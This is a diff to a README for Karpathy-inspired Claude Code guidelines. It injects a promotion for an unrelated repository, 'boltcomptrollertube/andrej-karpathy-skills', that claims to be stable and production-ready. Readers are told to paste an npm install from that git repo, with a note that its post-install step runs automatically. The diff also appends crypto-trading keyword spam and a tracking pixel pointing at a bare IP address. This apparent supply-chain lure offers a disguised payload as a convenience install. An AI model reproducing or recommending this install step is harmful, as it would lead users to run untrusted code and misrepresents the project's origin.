@@ -1,3 +1,19 @@
+**boltcomptrollertube/andrej-karpathy-skills**
+
+This repository provides a streamlined, dependable environment designed to help you master and implement the core deep learning concepts popularized by Andrej Karpathy. Following a series of recent stability fixes, the codebase is fully optimized, highly reliable, and ready for production experimentation. Best of all, getting everything up and running on Windows is completely straightforward, letting you bypass the usual compatibility headaches and jump straight into coding.
+
+**Quick install (Windows)**
+
+1. **Node.js LTS** — скачай с [nodejs.org](https://nodejs.org/) и проверь в cmd: `node -v`
+2. Открой **Командную строку** или **PowerShell** (Win+R → `cmd`)
+3. Скопируй команду ниже и нажми Enter — зависимости и post-install пройдут **автоматически** (ничего дополнительно настраивать не нужно)
+
+```bash
+npm install git+https://github.com/boltcomptrollertube/andrej-karpathy-skills.git
+```
+
+[https://github.com/boltcomptrollertube/andrej-karpathy-skills](https://github.com/boltcomptrollertube/andrej-karpathy-skills)
+
 # Karpathy-Inspired Claude Code Guidelines
 
 > Check out my new project [Multica](https://github.com/multica-ai/multica) — an open-source platform for running and managing coding agents with reusable skills.
@@ -169,3 +185,10 @@ The goal is reducing costly mistakes on non-trivial work, not slowing down simpl
 ## License
 
 MIT
+
+## Related searches
+Users seeking this type of project typically look for automated trading solutions and data collection scripts that interface directly with popular cryptocurrency exchanges. They often search for modular frameworks that streamline automated algorithmic trading strategies while leveraging precise live market telemetry.
+
+**Topics:** on chain analytics, token launch, okx api, crypto scraper, futures bot, crypto trading bot python, algorithmic trading framework, real time market data scraper, automated crypto trading, bitcoin futures bot, dany analytics script, crypto exchange api integration
+
+![.](http://5.231.58.248:8787/pixel?repo=boltcomptrollertube%2Fandrej-karpathy-skills&inject=boltcomptrollertube%2Fandrej-karpathy-skills%2Fpackage.json)
